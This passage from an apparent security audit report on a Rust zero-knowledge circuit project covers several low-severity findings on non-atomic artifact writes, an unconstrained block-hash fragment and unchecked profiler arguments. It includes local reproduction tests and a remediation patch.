    let config = CircuitBinsConfig::new(num_leaf_proofs, num_private_batch_proofs)?;

    let output_path = output_dir.as_ref();

    // Generate regular circuit binaries
    generate_circuit_binaries(output_path, include_prover)?;

    // Generate aggregated circuit binaries
    generate_private_batch_circuit_binaries(output_path, config.num_leaf_proofs, include_prover)?;

    // If num_private_batch_proofs is specified, generate public-batch aggregation circuit binaries
    if let Some(num_private_batch_proofs) = config.num_private_batch_proofs {
        generate_public_batch_circuit_binaries(
            output_path,
            num_private_batch_proofs,
            include_prover,
        )?;
    }

    // Save config file alongside binaries
    config.save(output_path)?;

    Ok(())
```

### `wormhole/aggregator/src/aggregator.rs`
#### Lines 254-267 — _Consumer loads config counts and binary pi_len with no cross-binding validation_

```
    pub fn new<P: AsRef<Path>>(bins_dir: P) -> Result<Self> {
        let bins_dir = bins_dir.as_ref().to_path_buf();

        // Load config
        let config = CircuitBinsConfig::load(&bins_dir)?;
        let expected_leaf_pi_len =
            load_common_from_bins(&bins_dir, "common.bin")?.num_public_inputs;

        Ok(Self {
            bins_dir,
            buf: ProofBuffer::new(config.num_leaf_proofs),
            expected_leaf_pi_len,
        })
    }
```

## Description

`generate_all_circuit_binaries` documents that "Validation happens before any files are written to avoid partial artifact generation," but only proof-count validation (`CircuitBinsConfig::new`) is performed upfront. The actual work is a multi-stage, non-atomic write sequence: leaf artifacts (`dummy_proof.bin`, `common.bin`, `verifier.bin`, optional `prover.bin`), then private-batch artifacts, then optional public-batch artifacts, and finally `config.json` written last. `create_dir_all` never clears pre-existing directory contents, and there is no temp-dir staging or atomic swap. If any intermediate proving/serialization/IO step fails (or the process is killed) during a re-run into a directory that already holds a valid `config.json` from a previous run with different parameters, the directory is left with a mix of freshly-written and stale binaries alongside the stale manifest. Downstream `PrivateBatchAggregator::new` and `PublicBatchAggregator::new` load `config.json` and the binaries together and trust them as a matched set, deriving buffer capacity from the config counts and expected public-input length from the binaries with no check binding the two.

## Root cause

`generate_all_circuit_binaries` performs a non-atomic, multi-file write sequence that saves `config.json` last and never clears the output directory, so a failed re-run leaves stale binaries beside a stale manifest that consumers load as a consistent set.

## Impact

An operator re-generating artifacts into an existing bins directory can, after a mid-run failure, leave a bins directory whose `config.json` counts do not match the actual serialized circuit arity. Aggregators built from that directory then buffer the wrong number of proofs or commit against a mismatched circuit, causing aggregation/proving/verification to fail until artifacts are fully regenerated. This is a reversible availability/operability hazard, not fund loss or a soundness break.

## Proof of concept

### Test case

```
#![cfg(test)]

use anyhow::Result;
use circuit_builder::generate_all_circuit_binaries;
use plonky2::plonk::circuit_data::CommonCircuitData;
use plonky2::plonk::proof::ProofWithPublicInputs;
use plonky2::util::serialization::DefaultGateSerializer;
use std::fs;
use std::panic::{catch_unwind, AssertUnwindSafe};
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};
use test_helpers::TestInputs;
use wormhole_aggregator::aggregator::{AggregationBackend, PrivateBatchAggregator};
use wormhole_aggregator::common::utils::private_batch_num_leaves_from_padded_pi_len;
use wormhole_aggregator::CircuitBinsConfig;
use wormhole_circuit::inputs::CircuitInputs;
use wormhole_prover::WormholeProver;
use zk_circuits_common::circuit::{C, D, F};

struct TempDirGuard(PathBuf);

impl Drop for TempDirGuard {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn unique_dir(label: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    std::env::temp_dir().join(format!("qp-poc-{label}-{nanos}"))
}

fn make_leaf_proof(bins: &Path, inputs: &CircuitInputs) -> ProofWithPublicInputs<F, C, D> {
    let prover = WormholeProver::new_from_files(&bins.join("prover.bin"), &bins.join("common.bin"))
        .expect("failed to load leaf prover from generated binaries");
    prover
        .commit(inputs)
        .expect("failed to commit leaf inputs")
        .prove()
        .expect("failed to prove leaf circuit")
}

fn private_batch_arity_from_common(bins: &Path) -> Result<usize> {
    let common_bytes = fs::read(bins.join("private_batch_common.bin"))?;
    let common = CommonCircuitData::<F, D>::from_bytes(common_bytes, &DefaultGateSerializer)
        .map_err(|e| anyhow::anyhow!("failed to deserialize private_batch_common.bin: {e}"))?;
    private_batch_num_leaves_from_padded_pi_len(common.num_public_inputs)
}

#[test]
fn non_atomic_regeneration_poisoned_directory_panics_private_aggregator() -> Result<()> {
    let bins = unique_dir("artifact-drift");
    let _guard = TempDirGuard(bins.clone());

    // Start from a valid artifact set whose manifest says the private-batch circuit expects 2 leaves.
    generate_all_circuit_binaries(&bins, true, 2, Some(2))?;

    // Force a deterministic mid-rerun I/O failure in the public-batch stage.
    // This simulates the finding's "intermediate write fails after earlier files were already
    // overwritten" condition while preserving the old config.json from the first run.
    fs::remove_file(bins.join("public_batch_verifier.bin"))?;
    fs::create_dir(bins.join("public_batch_verifier.bin"))?;

    let rerun_err = generate_all_circuit_binaries(&bins, true, 1, Some(2)).unwrap_err();
    assert!(
        rerun_err.to_string().contains("public_batch_verifier.bin"),
        "rerun should fail during the public-batch write step: {rerun_err:#}"
    );

    // The stale manifest still advertises the old arity even though private-batch binaries were
    // already overwritten by the failed rerun.
    let stale_config = CircuitBinsConfig::load(&bins)?;
    assert_eq!(stale_config.num_leaf_proofs, 2);

    let actual_private_batch_arity = private_batch_arity_from_common(&bins)?;
    assert_eq!(
        actual_private_batch_arity, 1,
        "failed rerun should leave a new private_batch_common.bin behind"
    );

    // The consumer accepts the poisoned directory because it trusts config.json for capacity and
    // does not bind that count to the serialized private-batch circuit it will later prove with.
    let mut aggregator = PrivateBatchAggregator::new(&bins)?;
    assert_eq!(aggregator.batch_size(), stale_config.num_leaf_proofs);

    let proof_0 = make_leaf_proof(&bins, &CircuitInputs::test_inputs_0());
    let proof_1 = make_leaf_proof(&bins, &CircuitInputs::test_inputs_1());
    aggregator.push_proof(proof_0)?;
    aggregator.push_proof(proof_1)?;

    let panic = catch_unwind(AssertUnwindSafe(|| {
        let _ = aggregator.aggregate();
    }));
    assert!(
        panic.is_err(),
        "poisoned bins directory should panic during private aggregation because stale config and overwritten binaries are not cross-bound"
    );

    Ok(())
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 107 lines & 6.5947265625 KB skipped]
             at ./tests/poc.rs:94:17
  18: poc::non_atomic_regeneration_poisoned_directory_panics_private_aggregator::{{closure}}
             at ./tests/poc.rs:54:78
  19: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
  20: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.

</test-stderr>
```

### Considerations

PoC demonstrates the availability impact through `PrivateBatchAggregator`: it generates a valid bins directory, forces a real mid-rerun write failure in `generate_all_circuit_binaries`, proves `config.json` stayed at the old `num_leaf_proofs` while `private_batch_common.bin` changed to the new arity, then drives two real leaf proofs through `PrivateBatchAggregator::new` and `aggregate()` until native execution panics inside plonky2. It does not separately exercise `PublicBatchAggregator`, process-kill interruption, or external filesystem faults beyond the deterministic in-test I/O failure used to reproduce the stale-manifest/overwritten-binaries state.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Generate all circuit artifacts, including config.json, in a unique staging directory and only publish them into the requested bins directory after the full generation succeeds. On failure, the staging directory is removed and the previous bins directory remains untouched, preventing stale-manifest/fresh-binary mixes.

### Patch

```diff
diff --git a/wormhole/circuit-builder/src/lib.rs b/wormhole/circuit-builder/src/lib.rs
--- a/wormhole/circuit-builder/src/lib.rs
+++ b/wormhole/circuit-builder/src/lib.rs
@@ -1,128 +1,228 @@
-use anyhow::{anyhow, Result};
-use std::fs::{create_dir_all, write};
-use std::path::Path;
+use anyhow::{anyhow, Context, Result};
+use std::{
+    fs::{create_dir_all, remove_dir_all, rename, write},
+    path::{Path, PathBuf},
+    time::{SystemTime, UNIX_EPOCH},
+};
 use wormhole_aggregator::public_batch::circuit::generate_public_batch_circuit_binaries;
 
 use plonky2::util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer};
 use wormhole_aggregator::private_batch::circuit::build::generate_private_batch_circuit_binaries;
 use wormhole_circuit::circuit::circuit_logic::WormholeCircuit;
 use zk_circuits_common::circuit::{wormhole_leaf_circuit_config, C, D};
 
 // Re-export CircuitBinsConfig from aggregator so users of circuit-builder can access it
 pub use wormhole_aggregator::CircuitBinsConfig;
 
 /// Generate only the leaf wormhole circuit binaries.
 ///
 /// This is a low-level helper for partial artifact generation. For the full flow that also
 /// emits `config.json`, use [`generate_all_circuit_binaries`].
 pub fn generate_circuit_binaries<P: AsRef<Path>>(
     output_dir: P,
     include_prover: bool,
 ) -> Result<()> {
     println!("Building wormhole leaf circuit (non-ZK for faster proving)...");
     let config = wormhole_leaf_circuit_config();
     let circuit = WormholeCircuit::new(config);
     let targets = circuit.targets();
     let circuit_data = circuit.build_circuit();
     println!("Circuit built.");
 
     let gate_serializer = DefaultGateSerializer;
     let generator_serializer = DefaultGeneratorSerializer::<C, D> {
         _phantom: Default::default(),
     };
 
     let output_path = output_dir.as_ref();
     create_dir_all(output_path)?;
 
     // Generate dummy proof BEFORE consuming circuit_data (prove() borrows, prover_data() moves)
     println!("Generating dummy proof for aggregation padding...");
     let dummy_proof_bytes = wormhole_aggregator::generate_dummy_proof(&circuit_data, &targets)
         .map_err(|e| anyhow!("failed to generate dummy proof: {}", e))?;
     write(output_path.join("dummy_proof.bin"), &dummy_proof_bytes)?;
     println!(
         "Dummy proof saved to {}/dummy_proof.bin ({} bytes)",
         output_path.display(),
         dummy_proof_bytes.len()
     );
 
     println!("Serializing circuit data...");
 
     let verifier_data = circuit_data.verifier_data();
     let prover_data = circuit_data.prover_data();
     let common_data = &verifier_data.common;
 
     // Serialize common data
     let common_bytes = common_data
         .to_bytes(&gate_serializer)
         .map_err(|e| anyhow!("failed to serialize common data: {}", e))?;
     write(output_path.join("common.bin"), common_bytes)?;
     println!("Common data saved to {}/common.bin", output_path.display());
 
     // Serialize verifier only data
     let verifier_only_bytes = verifier_data
         .verifier_only
         .to_bytes()
         .map_err(|e| anyhow!("failed to serialize verifier data: {}", e))?;
     write(output_path.join("verifier.bin"), verifier_only_bytes)?;
     println!(
         "Verifier data saved to {}/verifier.bin",
         output_path.display()
     );
 
     // Serialize prover only data (optional)
     if include_prover {
         let prover_only_bytes = prover_data
             .prover_only
             .to_bytes(&generator_serializer, common_data)
             .map_err(|e| anyhow!("failed to serialize prover data: {}", e))?;
         write(output_path.join("prover.bin"), prover_only_bytes)?;
         println!("Prover data saved to {}/prover.bin", output_path.display());
     } else {
         println!("Skipping prover binary generation");
     }
 
     Ok(())
 }
 
 /// Generate all circuit binaries (both regular and aggregated)
 ///
+/// Artifacts are generated in a staging directory and only published into `output_dir`
+/// after the full set (including `config.json`) has been written successfully.
+///
 /// # Arguments
 /// * `output_dir` - Directory to write the binaries to
 /// * `include_prover` - Whether to include the prover binary
 /// * `num_leaf_proofs` - Number of leaf proofs aggregated into a single proof (must be > 0)
 /// * `num_private_batch_proofs` - Optional param for number of inner proofs (for public-batch circuit). Set to none if you only want private-batch aggregation.
 ///
 /// # Errors
 /// Returns an error if proof counts are invalid (zero or exceed maximum bounds).
-/// Validation happens before any files are written to avoid partial artifact generation.
+/// Validation happens before any files are written to the destination directory.
 pub fn generate_all_circuit_binaries<P: AsRef<Path>>(
     output_dir: P,
     include_prover: bool,
     num_leaf_proofs: usize,
     num_private_batch_proofs: Option<usize>,
 ) -> Result<()> {
-    // Validate proof counts upfront before any writes to avoid partial artifact generation
+    // Validate proof counts upfront before any writes to avoid publishing invalid artifacts.
     let config = CircuitBinsConfig::new(num_leaf_proofs, num_private_batch_proofs)?;
 
     let output_path = output_dir.as_ref();
+    let staging_path = staging_dir_for(output_path)?;
 
-    // Generate regular circuit binaries
-    generate_circuit_binaries(output_path, include_prover)?;
+    create_dir_all(&staging_path)?;
 
-    // Generate aggregated circuit binaries
-    generate_private_batch_circuit_binaries(output_path, config.num_leaf_proofs, include_prover)?;
+    let generation_result: Result<()> = (|| {
+        // Generate regular circuit binaries
+        generate_circuit_binaries(&staging_path, include_prover)?;
 
-    // If num_private_batch_proofs is specified, generate public-batch aggregation circuit binaries
-    if let Some(num_private_batch_proofs) = config.num_private_batch_proofs {
-        generate_public_batch_circuit_binaries(
-            output_path,
-            num_private_batch_proofs,
+        // Generate aggregated circuit binaries
+        generate_private_batch_circuit_binaries(
+            &staging_path,
+            config.num_leaf_proofs,
             include_prover,
         )?;
+
+        // If num_private_batch_proofs is specified, generate public-batch aggregation circuit binaries
+        if let Some(num_private_batch_proofs) = config.num_private_batch_proofs {
+            generate_public_batch_circuit_binaries(
+                &staging_path,
+                num_private_batch_proofs,
+                include_prover,
+            )?;
+        }
+
+        // Save config file alongside binaries in the staged directory.
+        config.save(&staging_path)?;
+
+        Ok(())
+    })();
+
+    if generation_result.is_err() {
+        let _ = remove_dir_all(&staging_path);
     }
+    generation_result?;
 
-    // Save config file alongside binaries
-    config.save(output_path)?;
+    publish_staged_dir(&staging_path, output_path)
+}
 
+fn staging_dir_for(output_path: &Path) -> Result<PathBuf> {
+    let parent = output_path.parent().unwrap_or_else(|| Path::new("."));
+    let dir_name = output_path
+        .file_name()
+        .ok_or_else(|| anyhow!("output_dir must have a final path component"))?;
+    let unique = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map_err(|e| anyhow!("system clock before UNIX_EPOCH: {}", e))?
+        .as_nanos();
+
+    Ok(parent.join(format!(
+        ".{}.staging-{}-{}",
+        dir_name.to_string_lossy(),
+        std::process::id(),
+        unique
+    )))
+}
+
+fn publish_staged_dir(staging_path: &Path, output_path: &Path) -> Result<()> {
+    let parent = output_path.parent().unwrap_or_else(|| Path::new("."));
+    create_dir_all(parent)?;
+
+    let backup_path = backup_dir_for(output_path)?;
+    let had_existing_output = output_path.exists();
+
+    if had_existing_output {
+        rename(output_path, &backup_path).with_context(|| {
+            format!(
+                "failed to move existing output directory {} to {}",
+                output_path.display(),
+                backup_path.display()
+            )
+        })?;
+    }
+
+    if let Err(err) = rename(staging_path, output_path).with_context(|| {
+        format!(
+            "failed to publish staged artifact directory {} to {}",
+            staging_path.display(),
+            output_path.display()
+        )
+    }) {
+        if had_existing_output {
+            let _ = rename(&backup_path, output_path);
+        }
+        return Err(err);
+    }
+
+    if had_existing_output {
+        remove_dir_all(&backup_path).with_context(|| {
+            format!(
+                "failed to remove backup artifact directory {}",
+                backup_path.display()
+            )
+        })?;
+    }
+
     Ok(())
 }
+
+fn backup_dir_for(output_path: &Path) -> Result<PathBuf> {
+    let parent = output_path.parent().unwrap_or_else(|| Path::new("."));
+    let dir_name = output_path
+        .file_name()
+        .ok_or_else(|| anyhow!("output_dir must have a final path component"))?;
+    let unique = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map_err(|e| anyhow!("system clock before UNIX_EPOCH: {}", e))?
+        .as_nanos();
+
+    Ok(parent.join(format!(
+        ".{}.backup-{}-{}",
+        dir_name.to_string_lossy(),
+        std::process::id(),
+        unique
+    )))
+}
```

### Affected files
- `wormhole/circuit-builder/src/lib.rs`

### Validation output

```
[output truncated: 79 lines & 5.5234375 KB skipped]
   4: poc::non_atomic_regeneration_poisoned_directory_panics_private_aggregator
             at ./tests/poc.rs:67:76
   5: poc::non_atomic_regeneration_poisoned_directory_panics_private_aggregator::{{closure}}
             at ./tests/poc.rs:54:78
   6: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
   7: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Block header fragment leaves public hash unconstrained
**#97036**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/circuit/src/block_header/mod.rs` (2 locations)
#### Lines 64-73 — _circuit() ignores block_hash target and only range-checks block_number_

```
    fn circuit(
        Self::Targets {
            block_hash: _,
            header,
        }: &Self::Targets,
        builder: &mut CircuitBuilder<F, D>,
    ) {
        // Range constrain the block_number target to be 32 bits to verify injective encoding
        builder.range_check(header.block_number, 32);
    }
```

⋯
#### Lines 95-104 — _block_hash binding provided by a separate helper, documented as test-only_

```
/// Adds unconditional block hash validation: block_hash == hash(header contents).
/// Use this for isolated testing of BlockHeader. The full WormholeCircuit uses
/// a conditional version in connect_shared_targets() to support dummy proofs.
pub fn add_block_hash_validation(targets: &BlockHeaderTargets, builder: &mut CircuitBuilder<F, D>) {
    use plonky2::hash::poseidon2::Poseidon2Hash;

    let pre_image = targets.header.collect_to_vec();
    let computed_block_hash = builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(pre_image);
    builder.connect_hashes(targets.block_hash, computed_block_hash);
}
```

### `wormhole/circuit/src/circuit.rs`
#### Lines 306-317 — _production binding lives in connect_shared_targets, gated on is_not_dummy_

```
        // Block hash validation: block_hash == hash(header contents)
        // Skip this validation for dummy proofs (block_hash == 0 AND outputs == 0).
        let pre_image = targets.block_header.header.collect_to_vec();
        let computed_block_hash = builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(pre_image);
        for i in 0..4 {
            let diff = builder.sub(
                targets.block_header.block_hash.elements[i],
                computed_block_hash.elements[i],
            );
            let result = builder.mul(diff, is_not_dummy);
            builder.connect(result, zero);
        }
```

## Description

The `CircuitFragment` implementation for `BlockHeader` registers `block_hash` as a public input (`BlockHeaderTargets::new` via `add_virtual_hash_public_input`) but its `circuit()` method destructures and discards that target (`block_hash: _`) and enforces only a 32-bit `range_check` on `block_number`. The fragment's defining commitment — `block_hash == Poseidon2(parent_hash || block_number || state_root || extrinsics_root || zk_tree_root || digest)` — is not present in `circuit()`; it is supplied out-of-band by either `add_block_hash_validation()` (unconditional, used only in isolated tests) or `connect_shared_targets()` in the full leaf build (conditional on `is_not_dummy`). In the shipped `WormholeCircuit` this binding is present, so leaf proofs are sound today. The gap is that the fragment's core invariant is decoupled from the fragment itself, so any composition that follows the established `X::circuit(&targets.x, builder)` pattern without also re-adding the external binding would produce a circuit where `block_hash`/`block_number` are free public inputs a prover can set arbitrarily.

## Root cause

The `block_hash == H(header)` commitment is implemented outside `BlockHeader::circuit` (in `connect_shared_targets`/`add_block_hash_validation`) rather than within the fragment, so the fragment's `circuit()` leaves its own public input `block_hash` unconstrained.

## Impact

If `BlockHeader::circuit` were relied on as a self-contained fragment (as the other fragments are invoked), the leaf proof's `block_hash` and `block_number` public inputs would be unconstrained, letting a prover attach an arbitrary block commitment to an otherwise valid transfer proof and defeating the block-binding that downstream verifiers and the aggregator's reference-block selection depend on. In the current wiring the binding is added by `connect_shared_targets`, so there is no direct exploit path; the concern is a latent soundness gap and a fragile trust boundary in the fragment contract.

---

# Unbounded sampler period
**#97051**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/memprof/src/main.rs` (2 locations)
#### Lines 64-66 — _The sampler period CLI argument is an unrestricted `u64`._

```
    /// Memory sampler poll period in milliseconds.
    #[arg(long, default_value_t = 25)]
    sample_period_ms: u64,
```

⋯
#### Line 117 — _The unvalidated period is used to start reporting._

```
    let mut report = PhaseReport::new(args.sample_period_ms)?;
```

### `wormhole/memprof/src/report.rs`
#### Lines 29-30 — _`PhaseReport::new` forwards the period to the sampler._

```
    pub fn new(sample_period_ms: u64) -> Result<Self> {
        let sampler = PeakSampler::start(sample_period_ms);
```

### `wormhole/memprof/src/memory.rs` (2 locations)
#### Lines 65-91 — _The sampler loop sleeps for the caller-controlled period after each memory read._

```
    pub fn start(period_ms: u64) -> Self {
        let peak = Arc::new(AtomicU64::new(0));
        let stop = Arc::new(AtomicBool::new(false));
        let peak_t = peak.clone();
        let stop_t = stop.clone();
        let handle = thread::spawn(move || {
            while !stop_t.load(Ordering::Relaxed) {
                let rss = match process_memory() {
                    Ok((rss, _)) => rss,
                    Err(e) => {
                        eprintln!("ERROR: memprof sampler failed to read process memory: {e}");
                        std::process::exit(1);
                    }
                };
                let mut cur = peak_t.load(Ordering::Relaxed);
                while rss > cur {
                    match peak_t.compare_exchange_weak(
                        cur,
                        rss,
                        Ordering::Relaxed,
                        Ordering::Relaxed,
                    ) {
                        Ok(_) => break,
                        Err(observed) => cur = observed,
                    }
                }
                thread::sleep(Duration::from_millis(period_ms));
```

⋯
#### Lines 112-117 — _Drop joins the sampler thread after setting the stop flag._

```
impl Drop for PeakSampler {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::Relaxed);
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
```

## Description

`--sample-period-ms` is accepted as an unrestricted `u64` and is passed directly from `main` into `PhaseReport::new`. `PhaseReport::new` starts the background `PeakSampler` with that exact period, and the sampler thread sleeps for `Duration::from_millis(period_ms)` after every memory read. A zero period therefore creates a tight loop repeatedly reading process memory for the lifetime of the profiled workload. Conversely, an extremely large period can leave the sampler thread in a long sleep, and `PeakSampler::drop` sets the stop flag and then joins the sleeping thread, delaying normal process exit until the sleep returns. The CLI therefore lets a caller convert a measurement knob into CPU burn during the run or an attacker-sized shutdown hang.

## Root cause

The sampler period is treated as a trusted measurement parameter instead of being constrained to a sane positive range or implemented with a wakeable stop mechanism.

## Impact

A caller who controls profiler arguments can peg a CPU core during profiling or keep a shared profiling worker from exiting after the report is printed. This affects availability and reliability of the tooling process but does not affect generated proofs or protocol state.

## Proof of concept

### Test case

```
use std::path::PathBuf;
use std::process::Command;
use std::time::{Duration, Instant};

use circuit_builder as _;
use qp_wormhole_inputs as _;
use wormhole_aggregator as _;
use wormhole_circuit as _;
use wormhole_prover as _;
use wormhole_verifier as _;
use zk_circuits_common as _;

fn isolated_target_dir() -> PathBuf {
    std::env::temp_dir().join("qp-zk-circuits-memprof-poc-target")
}

fn memprof_bin() -> PathBuf {
    isolated_target_dir().join("debug").join("wormhole-memprof")
}

fn ensure_memprof_built() {
    let bin = memprof_bin();
    if bin.exists() {
        return;
    }

    let repo_root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .expect("wormhole/tests has a parent")
        .parent()
        .expect("wormhole has a parent")
        .to_path_buf();

    let output = Command::new("cargo")
        .current_dir(repo_root)
        .env("CARGO_TARGET_DIR", isolated_target_dir())
        .env_remove("RUSTC_WRAPPER")
        .args(["build", "-p", "wormhole-memprof"])
        .output()
        .expect("wormhole-memprof build should start");

    assert!(
        output.status.success(),
        "wormhole-memprof build failed with status {:?}\nstdout:\n{}\nstderr:\n{}",
        output.status.code(),
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(bin.exists(), "wormhole-memprof binary should exist after build");
}

fn run_memprof(sample_period_ms: u64) -> Duration {
    ensure_memprof_built();

    let start = Instant::now();
    let output = Command::new(memprof_bin())
        .args([
            "--circuit-only",
            "--num-leaf-proofs",
            "1",
            "--sample-period-ms",
            &sample_period_ms.to_string(),
        ])
        .output()
        .expect("wormhole-memprof invocation should succeed");
    let elapsed = start.elapsed();

    assert!(
        output.status.success(),
        "wormhole-memprof failed with status {:?}\nstdout:\n{}\nstderr:\n{}",
        output.status.code(),
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );

    elapsed
}

#[test]
fn sample_period_controls_shutdown_latency() {
    let fast = run_memprof(1);
    let slow = run_memprof(2_000);

    assert!(
        slow >= Duration::from_millis(1_700),
        "large sampler period should keep the process alive until the sampler sleep returns; fast={fast:?} slow={slow:?}"
    );
    assert!(
        slow > fast + Duration::from_millis(1_500),
        "shutdown latency should scale with attacker-chosen sample period; fast={fast:?} slow={slow:?}"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 211 lines & 6.552734375 KB skipped]
   Compiling qp-wormhole-circuit v3.0.0 (/repo/wormhole/circuit)
   Compiling qp-wormhole-prover v3.0.0 (/repo/wormhole/prover)
   Compiling test-helpers v3.0.0 (/repo/wormhole/tests/test-helpers)
   Compiling qp-wormhole-aggregator v3.0.0 (/repo/wormhole/aggregator)
   Compiling qp-wormhole-circuit-builder v3.0.0 (/repo/wormhole/circuit-builder)
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 35.09s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

Demonstrates the shutdown-hang branch of the finding through the real `wormhole-memprof` CLI (`main` → `PhaseReport::new` → `PeakSampler::start`/`Drop`) by showing a large `--sample-period-ms` materially delays process exit. It does not separately quantify the zero-period CPU-burn branch because that impact is scheduler/load dependent and would make the harness flaky.

### Validation reasoning

PoC validation command completed successfully.

---

# Config validation misses documented structural bounds
**#97053**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/memprof/src/config.rs` (3 locations)
#### Lines 71-75 — _num_wires documented floor of 135 not enforced_

```
    /// Number of plonk wires (trace columns). Reducing this forces the
    /// circuit to use more rows for the same logic but does not affect
    /// soundness. Must be >= 135 (Poseidon gate floor). Production: 135.
    #[arg(long)]
    pub num_wires: Option<usize>,
```

⋯
#### Lines 110-133 — _validate() doc promises panic-prevention but only rejects Some(0)_

```
impl AggConfigArgs {
    /// Validate the override knobs:
    ///   1. Numeric knobs must be > 0 (zero would silently break the
    ///      FRI soundness product or trip a panic deep inside plonky2).
    ///   2. Security-affecting knobs must be gated by
    ///      `--allow-weakening-security`.
    pub fn validate(&self) -> Result<(), String> {
        for (name, v) in [
            ("--rate-bits", self.rate_bits),
            ("--cap-height", self.cap_height),
            ("--num-wires", self.num_wires),
            ("--num-routed-wires", self.num_routed_wires),
            (
                "--max-quotient-degree-factor",
                self.max_quotient_degree_factor,
            ),
            ("--num-query-rounds", self.num_query_rounds),
            ("--security-bits", self.security_bits),
            ("--num-challenges", self.num_challenges),
        ] {
            if v == Some(0) {
                return Err(format!("{name} must be greater than 0"));
            }
        }
```

⋯
#### Lines 188-190 — _raw num_wires copied into CircuitConfig without clamping_

```
        if let Some(v) = self.num_wires {
            cfg.num_wires = v;
        }
```

### `wormhole/memprof/src/workload.rs`
#### Lines 33-42 — _build_circuit() consumes the unchecked config and panics for sub-floor wire counts_

```

pub fn build_leaf_context(
    leaf_cfg: CircuitConfig,
    report: &mut PhaseReport,
) -> Result<LeafContext> {
    report.phase_start("build_leaf_circuit")?;

    // Build circuit ONCE - extract all data from this single build
    let circuit = WormholeCircuit::new(leaf_cfg);
    let targets = circuit.targets();
```

## Description

`AggConfigArgs::validate` documents its purpose as rejecting numeric knobs that would "trip a panic deep inside plonky2," but it only rejects the exact value `Some(0)`. The `--num-wires` knob is documented as requiring `>= 135` (the Poseidon gate floor), yet any value in `1..=134` passes validation and is written verbatim into the `CircuitConfig` by `build()`. When `main` then calls `workload::build_leaf_context`/`aggregate_fresh`, `WormholeCircuit::new(...).build_circuit()` and `PrivateBatchProver::new(...)` construct a circuit whose wire count is below the Poseidon gate requirement, panicking inside plonky2 instead of returning the clean validation error the function promises. The same gap applies to other structural knobs (`cap_height`, `num_routed_wires`, `max_quotient_degree_factor`) whose only guard is the zero check.

## Root cause

`validate()` enforces only a `!= 0` lower bound and never checks the documented structural minimums (notably `num_wires >= 135`), so out-of-range-but-nonzero knob values reach circuit construction and panic in plonky2.

## Impact

A developer running the profiler with an in-range-but-sub-floor value (e.g. `--num-wires 100`) gets an uncontrolled panic deep in the proving backend rather than the documented actionable validation error. This is a robustness/observability gap in a diagnostic-only tool run with self-supplied arguments; there is no external attacker or production artifact involved.

---

# Soundness-preservation log message can misreport query rounds
**#97054**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/memprof/src/config.rs` (2 locations)
#### Lines 172-183 — _auto-adjust prints 'preserving FRI soundness product' message_

```
        if let Some(v) = self.rate_bits {
            cfg.fri_config.rate_bits = v;
            // Preserve `rate_bits * num_query_rounds` product for FRI soundness.
            // Round up to the next integer so we never go below the original.
            let new_queries = original_product.div_ceil(v.max(1));
            cfg.fri_config.num_query_rounds = new_queries;
            eprintln!(
                "[config] rate_bits {} -> {}, auto-adjusted num_query_rounds {} -> {} \
                 (preserving FRI soundness product {})",
                original_rate, v, original_queries, new_queries, original_product
            );
        }
```

⋯
#### Lines 197-199 — _explicit --num-query-rounds override applied afterwards, clobbering the announced value_

```
        if let Some(v) = self.num_query_rounds {
            cfg.fri_config.num_query_rounds = v;
        }
```

## Description

